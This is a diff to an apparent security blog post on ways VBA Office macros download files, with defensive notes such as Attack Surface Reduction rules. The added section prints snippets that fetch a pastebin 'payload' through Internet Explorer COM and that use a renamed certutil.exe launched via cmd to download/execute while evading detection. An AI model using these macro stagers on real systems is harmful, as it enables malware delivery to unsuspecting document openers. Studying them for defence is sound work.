@@ -72,7 +72,7 @@ Sub Download_File_API()
 End Sub
 ```
 
-The third method involves calling out to Powershell and using another program (in this case PowerShell) to download the desired file. Like the two examples above this code has the same end result of downloading the google logo into the AppData folder. In this example however you can clearly see PowerShell pop up and know that another process has been started. Attackers will typically get fancier then this example code and will often Encode parameters to hide URL's. The Windows 10, Attack Surface Reduction rule for [**Block all Office applications from creating child processes**](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction#block-all-office-applications-from-creating-child-processes) would mitigate the below example as it would prevent Office from launching PowerShell.
+The previous two techniques will generate an outbound network connection from the Office executables which could appear as a red flag to a defender .The third method involves calling out to Powershell and using another program (in this case PowerShell) to download the desired file. Like the two examples above this code has the same end result of downloading the google logo into the AppData folder. In this example however you can clearly see PowerShell pop up and know that another process has been started. Attackers will typically get fancier then this example code and will often Encode parameters to hide URL's. The Windows 10, Attack Surface Reduction rule for [**Block all Office applications from creating child processes**](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction#block-all-office-applications-from-creating-child-processes) would mitigate the below example as it would prevent Office from launching PowerShell.
 
 ```
 Sub Download_File_Powershell()
@@ -95,6 +95,36 @@ Lastly, just a note of caution, Even though the above code is totally benign and
 
 ![AVProtection](/images/macro_example_triggers_av.PNG)
 
+**Update:** As I was researching this topic further I stubbled upon two more methods to Download files using Macros over at f-secures blog. The two additional methods are fairly interesting. You can use Internet Explorer via COM to download a file. This will spawn a browser from svchost (not Office) to download a file.
+
+```
+Set ie = CreateObject("InternetExplorer.Application")
+ie.Navigate "https://pastebin.com/raw/tcmMXwMG"
+State = 0
+Do Until State = 4
+DoEvents
+State = ie.readyState
+Loop
+Dim payload: payload = ie.Document.Body.innerHTML
+```
+
+and lastly the final method mentioned in f-secure's blog is a trick to use a system binary to download/execute a payload. This approach is really simple using the copyfile function.
+
+```
+Set fso = CreateObject("Scripting.FileSystemObject")
+fso.copyfile "C:\Windows\System32\certutil.exe", Environ("TEMP") & "\CVR497F.tmp", True
+Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
+obj.Document.Application.ShellExecute "cmd", "/k cd %temp% && ren CVR497F.tmp CVR497F.com && CVR497F.com -ping https://pastebin.com/raw/tcmMXwMG > CVR31EF.tmp && del CVR497F.com", "", Null, 0
+```
+So in review we discussed 6 ways to use VBA Macro's to Download a file from the internet;
+1. Make an XML HTTP Request (XHR)
+2. Calling URLDownloadToFile Lib from urlmon
+3. Calling out to PowerShell
+4. Using legacy Excel 4.0 (XL4) macros
+5. Call Internet Explorer via COM
+6. Call a System Binary with copyfile
+
 
 ## Resources
-[Stackoverflow Discussion on Downloading File with VBA](https://stackoverflow.com/questions/17877389/how-do-i-download-a-file-using-vba-without-internet-explorer)
+* [Stackoverflow Discussion on Downloading File with VBA](https://stackoverflow.com/questions/17877389/how-do-i-download-a-file-using-vba-without-internet-explorer)
+* [Dechaining-macros blog by F-Secure](https://blog.f-secure.com/dechaining-macros-and-evading-edr/)
